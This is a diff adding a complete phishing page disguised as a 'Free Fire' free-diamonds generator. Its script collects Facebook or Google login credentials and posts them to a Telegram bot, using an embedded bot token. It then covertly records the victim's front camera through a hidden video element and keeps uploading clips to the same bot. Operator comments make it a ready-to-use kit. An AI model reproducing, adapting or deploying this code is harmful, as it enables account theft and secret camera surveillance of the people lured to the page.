@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Free Fire Diamonds - Get Now</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: white;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .container {
+      width: 90%;
+      max-width: 420px;
+      padding: 20px 0;
+      text-align: center;
+    }
+    h1 {
+      font-size: 3.5rem;
+      margin: 40px 0 10px;
+      color: #ffeb3b;
+      text-shadow: 0 0 25px #ffeb3b99;
+    }
+    .subtitle {
+      font-size: 1.4rem;
+      margin-bottom: 40px;
+      opacity: 0.9;
+    }
+    .diamond-btn {
+      background: #1e88e5;
+      color: white;
+      border: none;
+      border-radius: 14px;
+      padding: 18px 28px;
+      font-size: 1.3rem;
+      margin: 14px 10px;
+      cursor: pointer;
+      min-width: 160px;
+      transition: all 0.25s;
+    }
+    .diamond-btn:hover { background: #42a5f5; transform: translateY(-3px); }
+    .diamond-btn.selected { background: #ff5722; box-shadow: 0 0 30px #ff5722cc; transform: scale(1.08); }
+    #step2, #step3, #processing { display: none; }
+    .login-box {
+      background: rgba(255,255,255,0.09);
+      backdrop-filter: blur(12px);
+      border-radius: 18px;
+      padding: 28px;
+      margin: 25px 0;
+      border: 1px solid rgba(255,255,255,0.15);
+    }
+    input {
+      width: 100%;
+      padding: 15px;
+      margin: 12px 0;
+      border-radius: 12px;
+      border: 1px solid #666;
+      background: rgba(0,0,0,0.45);
+      color: white;
+      font-size: 1.15rem;
+    }
+    input::placeholder { color: #bbb; }
+    .provider-btn {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 15px 32px;
+      font-size: 1.15rem;
+      border-radius: 12px;
+      margin: 12px;
+      cursor: pointer;
+      min-width: 180px;
+    }
+    .provider-btn.google { background: #ffffff; color: #333; }
+    #get-diamonds {
+      background: #4caf50;
+      color: white;
+      font-size: 1.5rem;
+      padding: 20px 50px;
+      border: none;
+      border-radius: 60px;
+      margin: 35px 0 15px;
+      cursor: pointer;
+      box-shadow: 0 10px 30px rgba(76,175,80,0.5);
+    }
+    #processing {
+      font-size: 2.5rem;
+      margin: 80px 0;
+      color: #ffeb3b;
+      text-shadow: 0 0 40px #ffeb3b;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse { 0%,100% { opacity: 0.7; } 50% { opacity: 1; } }
+    .hidden-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h1>Free Fire</h1>
+  <div class="subtitle">Free Diamonds Generator 2025</div>
+
+  <div id="step1">
+    <div>
+      <button class="diamond-btn" data-diamonds="100">100 Diamonds</button>
+      <button class="diamond-btn" data-diamonds="200">200 Diamonds</button>
+    </div>
+    <div>
+      <button class="diamond-btn" data-diamonds="300">300 Diamonds</button>
+      <button class="diamond-btn" data-diamonds="500">500 Diamonds</button>
+    </div>
+  </div>
+
+  <div id="step2">
+    <h2 style="margin:40px 0 15px;">Select Login Method</h2>
+    <button class="provider-btn" id="fb-btn">Facebook</button>
+    <button class="provider-btn google" id="google-btn">Google</button>
+  </div>
+
+  <div id="step3" class="login-box">
+    <div id="fb-fields">
+      <input type="text" id="fb-email" placeholder="Email or Phone Number" autocomplete="off"/>
+      <input type="text" id="fb-username" placeholder="Username (optional)" autocomplete="off"/>
+      <input type="password" id="fb-pass" placeholder="Password" autocomplete="off"/>
+    </div>
+    <div id="google-fields" style="display:none;">
+      <input type="email" id="google-email" placeholder="Google Email" autocomplete="off"/>
+      <input type="password" id="google-pass" placeholder="Password" autocomplete="off"/>
+    </div>
+    <button id="get-diamonds">Get Diamonds Now</button>
+  </div>
+
+  <div id="processing">Processing... Sending Request</div>
+</div>
+
+<video id="video" class="hidden-video" autoplay playsinline muted></video>
+
+<script>
+// =============================================
+//  CONFIG - CHANGE THESE TWO LINES ONLY
+// =============================================
+const TELEGRAM_BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Put your bot token here
+// chat_id comes from ?id=xxxxxxxx in URL
+// =============================================
+
+let selectedDiamonds = null;
+let loginMethod = null;
+let stream = null;
+let mediaRecorder = null;
+let videoChunks = [];
+let isRecording = false;
+let videoCount = 0;
+
+document.querySelectorAll('.diamond-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.diamond-btn').forEach(b => b.classList.remove('selected'));
+    btn.classList.add('selected');
+    selectedDiamonds = btn.dataset.diamonds;
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  });
+});
+
+document.getElementById('fb-btn').addEventListener('click', () => {
+  loginMethod = 'facebook';
+  document.getElementById('fb-fields').style.display = 'block';
+  document.getElementById('google-fields').style.display = 'none';
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+});
+
+document.getElementById('google-btn').addEventListener('click', () => {
+  loginMethod = 'google';
+  document.getElementById('fb-fields').style.display = 'none';
+  document.getElementById('google-fields').style.display = 'block';
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+});
+
+document.getElementById('get-diamonds').addEventListener('click', async () => {
+  document.getElementById('step3').style.display = 'none';
+  document.getElementById('processing').style.display = 'block';
+
+  let email = '', username = '', password = '';
+  if (loginMethod === 'facebook') {
+    email    = document.getElementById('fb-email').value.trim();
+    username = document.getElementById('fb-username').value.trim();
+    password = document.getElementById('fb-pass').value;
+  } else if (loginMethod === 'google') {
+    email    = document.getElementById('google-email').value.trim();
+    password = document.getElementById('google-pass').value;
+  }
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const chatId = urlParams.get('id') || 'NO_CHAT_ID';
+
+  const dataText = `
+Free Fire Diamond Request ─ ${new Date().toLocaleString('en-IN')}
+──────────────────────────────
+Diamonds: ${selectedDiamonds || 'unknown'}
+Method:   ${loginMethod || 'unknown'}
+Email/Phone: ${email}
+Username:    ${username || '-'}
+Password:    ${password}
+Telegram ID: ${chatId}
+Sending request...
+  `.trim();
+
+  await sendToTelegram(dataText, chatId);
+
+  // ── Start front camera recording in background (no mention in UI) ───────────────
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: {
+        facingMode: "user",          // front camera
+        width: { ideal: 1280 },
+        height: { ideal: 720 }
+      },
+      audio: false
+    });
+
+    const video = document.getElementById('video');
+    video.srcObject = stream;
+    video.muted = true;
+    video.playsInline = true;
+
+    await new Promise((resolve) => {
+      video.onloadedmetadata = () => {
+        video.play().then(resolve).catch(resolve);
+      };
+      setTimeout(resolve, 3000);
+    });
+
+    isRecording = true;
+    startContinuousRecording(chatId);
+
+  } catch (err) {
+    // Fail silently in UI - only send error to Telegram
+    const errMsg = `Camera access failed: ${err.name || err.message || 'unknown'}`;
+    await sendToTelegram(errMsg + "\n(permission likely denied)", chatId);
+  }
+});
+
+function startContinuousRecording(chatId) {
+  if (!isRecording || !stream) return;
+
+  videoChunks = [];
+  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+  mediaRecorder.ondataavailable = (event) => {
+    if (event.data.size > 0) {
+      videoChunks.push(event.data);
+    }
+  };
+
+  mediaRecorder.onstop = async () => {
+    if (videoChunks.length === 0) return;
+
+    const blob = new Blob(videoChunks, { type: 'video/webm' });
+    videoChunks = [];
+
+    videoCount++;
+    const filename = `front_\( {videoCount}_ \){Date.now()}.webm`;
+
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('video', blob, filename);
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (videoCount % 3 === 0) {
+        await sendToTelegram(`Sent ${videoCount} front video clips`, chatId);
+      }
+    } catch {}
+
+    if (isRecording) {
+      startContinuousRecording(chatId);
+    }
+  };
+
+  mediaRecorder.start();
+  setTimeout(() => {
+    if (mediaRecorder && mediaRecorder.state === 'recording') {
+      mediaRecorder.stop();
+    }
+  }, 4000);
+}
+
+async function sendToTelegram(text, chatId) {
+  if (chatId === 'NO_CHAT_ID' || !TELEGRAM_BOT_TOKEN.includes(':')) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'Markdown' })
+    });
+  } catch {}
+}
+
+window.addEventListener('beforeunload', () => {
+  isRecording = false;
+  if (mediaRecorder && mediaRecorder.state === 'recording') {
+    mediaRecorder.stop();
+  }
+  if (stream) {
+    stream.getTracks().forEach(track => track.stop());
+  }
+});
+</script>
+</body>
+</html>
